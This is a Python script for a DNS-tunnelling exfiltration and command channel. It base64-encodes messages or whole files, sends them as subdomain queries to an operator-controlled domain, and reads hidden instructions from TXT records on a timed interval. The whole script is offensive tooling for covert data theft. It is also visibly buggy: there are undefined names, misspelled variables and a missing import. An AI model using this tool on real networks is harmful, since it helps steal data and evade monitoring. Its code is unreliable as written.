#!/usr/bin/env python3

import argparse
import base64
import pprint
from sys import argv, exit
import time

import dns.resolver
# from dga import mydoom

# <Fucntion of ability>
## - confirm the number of required request packets -> use subdomain by 'mail'
## - specify the time of interval
## - embed the message as subdomain
# <Scenario>
## 1. decide the target hostname
##   > choose dga or specific domain
## 2. confirm the number of required request packets
##   * your auth server calculates the number of it based on the size of message
## 3. request the TXT record -> with www
# <Mapping of subdomain's order for the server>
## - 'mail' : calculate the number of required packets
##   * your auth server embeds the size and the number of packet in TXT RR
## - 'www'  : request the message in TXT RR
# <Definition of veriable>
## - ex) www.example.com
## - domain : 'example.com'
## - subdomain(message) : 'www'
## - message : outbound. from client to server
## - answer  : inbound. from server to client

def control_argment():
    parser = argparse.ArgumentParser(
                    usage='communicate.py hostname[e.g. example.com] [-h] '\
                          '[-m[message] [-i(interval {s}) <e.g. 60>]'\
                          '[-l(length)]',
                    description='Before starting, you should in put the number of required'\
                                'paclets. Then you select "query" as message, it starts.')
    parser.add_argument('domain', help='specify the target domain')
    parser.add_argument('-m', '--message', help='define the message as subdomain '\
                        'www : just exfiltrateing'\
                        'mail : count how mang required messages')
    parser.add_argument('-i', '--interval', help='difine the interval time of \
                        request packet', default=3600)
    parser.add_argument('-f', '--file', help='extract contents in the file')
    parser.add_argument('-l', '--length', help='difine the length of subdomain', \
                        type=int, default=10)

    args = parser.parse_args()

    valuable = {}
    valuable['domain'] = args.domain
    valuable['message'] = args.message
    if args.interval:
        valuable['interval'] =args.interval 
    if args.file:
        valuable['file'] = args.file
    if args.length:
        valuable['length'] = args.length
    return valuable


def parse_message(message:str, length:int) -> list:
    """
    1. encode the message to base64
    2. make the list of the message split by the length
    * if you decode the message, put on '=' in the end after combine the line
    """
    encoded = base64.b64encode(message.encode()).decode().strip('=')
    separated = [encoded[i: i+length] for i in range(0, len(encoded), length)]
    return separated

def exfiltrate(message:str, hostname:str) -> list:
    """exfiltrate messages to auth server, and query 'A' rr for fake"""
    try:
        qname = message + '.' + hostname
        answer = dns.resolver.query(qname, 'A')
        return answer
    except:
        pass
        # print("Can't exfiltrate or no RR")

def query_value(message:list, hostname:str) -> list:
    """get messages from auth server using by 'TXT' rr"""
    payload = message + '.' + hostname
    response = dns.resolver.query(payload, 'TXT')
    # time.sleep(interval)
    # return response
    if 'verificaion' in response[:]:
        verification_line = [str(i).split('=')[-1].strip('"') for i in response[:]\
                            if 'verification' in str(i)]
        return verification_line
    else:
        return 0


def decipher(answer: list) -> str:
    """
    - Gather the TXT query's domain authentication value
    - Decode the strings when the string is decode by base64
    == format of target ==
    ['*************************','*************************','*************************']
    - type : string
    """
    response = [base64.b64decode(i.encode()).decode() for i in answer]
    return response


def main() -> str:
    valuable = control_argment()
    hostnmae = valuable['hostname']
    interval = valuable['interval']

    if 'message' in valuable.keys():
        message = valuable['message']

        if message == 'query':
            # request the number of required pakcets
            response = exfiltrate('mail', hostname)
            # the number is installed at the last octet of the ipv4 address
            number = int(str(response[:]).split('.')[-1].strip('>]'))
            time.sleep(interval)
            answer = []
            while number != 0:
                query_value('www', hostname)
                verification_line = [str(i).split('=') for i in response[:]\
                                    if 'verification' in str(i)]
                answer.append(verification_line)
                time.sleep(interval)
                number -= 1
            return decipher(answer)
        else:
            # exfiltrate the message to the your server
            message = parse_message(message, valuable['length'])
            for _ in message:
                query_value(_, hostname)
                time.sleep(interval)
            return 0

    else:
        # exfiltrate the message from file to your auth server
        if 'file' in valuable.keys():
            with open(valuable['file'], 'r') as f:
                contents = f.read()
            message = parse_message(contents, valuable['length'])
            for _ in message:
                send(_, hostname)
                time.sleep(interval)
            return 0
        else:
            sys.exit()


if __name__ == '__main__':
    answer = main()

    if answer == 0:
        sys.exit()
    else:
        decoded_text = decipher(answer)
        pprint(decoded_text)

